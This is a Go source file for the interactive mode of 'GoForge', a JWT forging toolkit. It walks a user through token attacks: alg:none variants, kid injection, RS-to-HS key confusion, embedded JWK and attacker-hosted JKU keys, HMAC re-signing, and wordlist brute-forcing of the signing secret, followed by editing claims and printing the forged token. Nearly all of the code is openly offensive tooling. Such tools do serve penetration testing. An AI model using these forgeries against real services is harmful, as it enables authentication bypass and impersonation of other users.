package main

import (
	"encoding/json"
	"fmt"
	"os"
	"runtime"
	"strings"
	"unicode/utf8"

	"github.com/AlecAivazis/survey/v2"
	"goforge/internal/attack"
	"goforge/internal/forge"
	"goforge/internal/jwt"
)

// bigBanner prints the big ASCII banner (normal CLI mode only).
func bigBanner() {
	art := ` _____     _____
|   __|___|   __|___ ___ ___ ___
|  |  | ⚒ |   __| ⚒ |  _| ⚒ | -_|
|_____|___|__|  |___|_| |_  |___|
                        |___|`
	fmt.Println(cyan + bold + art + reset)
	fmt.Println(cyan + strings.Repeat("━", 33) + reset)
	fmt.Println()
}

// boxLines draws a bold box around several lines.
func boxLines(lines []string) {
	w := 0
	for _, l := range lines {
		if n := utf8.RuneCountInString(l); n > w {
			w = n
		}
	}
	border := strings.Repeat("━", w+2)
	fmt.Println(cyan + "┏" + border + "┓" + reset)
	for _, l := range lines {
		pad := strings.Repeat(" ", w-utf8.RuneCountInString(l))
		fmt.Println(cyan + "┃ " + reset + bold + l + reset + pad + cyan + " ┃" + reset)
	}
	fmt.Println(cyan + "┗" + border + "┛" + reset)
}

// ask asks a survey question, replacing the "?" icon with the "[GoForge]>>" prompt.
func ask(p survey.Prompt, response any) error {
	return survey.AskOne(p, response, survey.WithIcons(func(icons *survey.IconSet) {
		icons.Question.Text = "[GoForge]>>"
	}))
}

// runInteractive runs the guided interactive mode.
func runInteractive() {
	boxLines([]string{"⚒ GoForge", "JWT forging toolkit"})
	fmt.Println()

	// 1. Read the token (also accepts @file)
	var raw string
	if err := ask(&survey.Input{Message: "Paste JWT (or @file):"}, &raw); err != nil {
		fmt.Println("[!]", err)
		return
	}
	raw, err := resolveValue(raw)
	if err != nil {
		fmt.Println("[!]", err)
		return
	}
	raw = strings.TrimSpace(raw)

	// 2. Parse + detected algorithm
	tok, err := jwt.Parse(raw)
	if err != nil {
		fmt.Println("[!]", err)
		return
	}
	if alg, ok := tok.Header["alg"].(string); ok {
		fmt.Printf("[+] Algorithm detected: %s\n\n", alg)
	}

	// 3. Attack menu (arrow keys)
	var choice string
	if err := ask(&survey.Select{
		Message: "Choose an attack:",
		Options: []string{
			"analyse (inspect)",
			"alg:none",
			"kid injection",
			"confusion RS->HS",
			"jwk embedded",
			"jku hosted",
			"HMAC (known key)",
			"bruteforce (wordlist)",
		},
	}, &choice); err != nil {
		fmt.Println("[!]", err)
		return
	}

	// analyse = read-only, no forging
	if choice == "analyse (inspect)" {
		fmt.Println()
		prettyHeader, _ := json.MarshalIndent(tok.Header, "", "  ")
		prettyBody, _ := json.MarshalIndent(tok.Payload, "", "  ")
		printSection("HEADER")
		fmt.Println(string(prettyHeader))
		printSection("PAYLOAD")
		fmt.Println(string(prettyBody))
		printSection("SIGNATURE")
		fmt.Println(tok.Parts[2])
		return
	}

	// 4. Fields to modify (same as --set)
	askFields(tok.Payload)

	// 5. Dispatch based on the chosen attack
	alg, _ := tok.Header["alg"].(string)
	o := forge.Options{Alg: alg}
	var forged string

	switch choice {
	case "alg:none":
		fmt.Println("\n[+] alg:none variants:")
		for _, v := range []string{"none", "None", "NONE", "nOnE"} {
			o.Alg = v
			t, e := forge.None(tok.Header, tok.Payload, o)
			if e != nil {
				fmt.Println("[!]", e)
				return
			}
			fmt.Printf("  [%s] %s\n", v, t)
		}
		return

	case "kid injection":
		var kid, key string
		ask(&survey.Input{Message: "kid value:"}, &kid)
		ask(&survey.Input{Message: "key (empty = /dev/null):"}, &key)
		key, _ = resolveValue(key)
		o.Kid, o.Key = kid, key
		forged, err = forge.Kid(tok.Header, tok.Payload, o)

	case "confusion RS->HS":
		var pub string
		ask(&survey.Input{Message: "public key file (PEM):"}, &pub)
		data, e := os.ReadFile(pub)
		if e != nil {
			fmt.Println("[!]", e)
			return
		}
		o.Key = string(data)
		forged, err = forge.Confusion(tok.Header, tok.Payload, o)

	case "jwk embedded":
		forged, err = forge.JWK(tok.Header, tok.Payload, o)

	case "jku hosted":
		var url string
		ask(&survey.Input{Message: "attacker JWKS URL:"}, &url)
		o.JkuURL = url
		var jwks string
		forged, jwks, err = forge.JKU(tok.Header, tok.Payload, o)
		if err == nil {
			fmt.Printf("\n[*] Host this JWKS at %s :\n%s\n", url, jwks)
		}

	case "HMAC (known key)":
		var key string
		ask(&survey.Input{Message: "key (or @file):"}, &key)
		key, _ = resolveValue(key)
		o.Key = key
		forged, err = forge.HMAC(tok.Header, tok.Payload, o)

	case "bruteforce (wordlist)":
		var wl string
		ask(&survey.Input{Message: "wordlist file:"}, &wl)
		found, e := attack.BruteforceKey(tok.Parts, wl, runtime.NumCPU(), alg)
		if e != nil {
			fmt.Println("[!]", e)
			return
		}
		if found == "" {
			fmt.Println("[!] no key found in the wordlist")
			return
		}
		fmt.Println("[+] Key found:", found)
		o.Key = found
		forged, err = forge.HMAC(tok.Header, tok.Payload, o)
	}

	if err != nil {
		fmt.Println("[!]", err)
		return
	}
	fmt.Println("\n[+] Forged token:")
	fmt.Println(forged)
}

// askFields prompts for field modifications (key=value) until an empty entry.
// Same logic as replaceValue: the value is parsed as JSON (true -> bool, etc.).
func askFields(body map[string]any) {
	for {
		var kv string
		ask(&survey.Input{Message: "Modify field (key=value, empty to finish):"}, &kv)
		kv = strings.TrimSpace(kv)
		if kv == "" {
			return
		}
		pair := strings.SplitN(kv, "=", 2)
		if len(pair) != 2 {
			fmt.Println("[!] format: key=value")
			continue
		}
		var parsed any
		if json.Unmarshal([]byte(pair[1]), &parsed) == nil {
			body[pair[0]] = parsed
		} else {
			body[pair[0]] = pair[1]
		}
	}
}
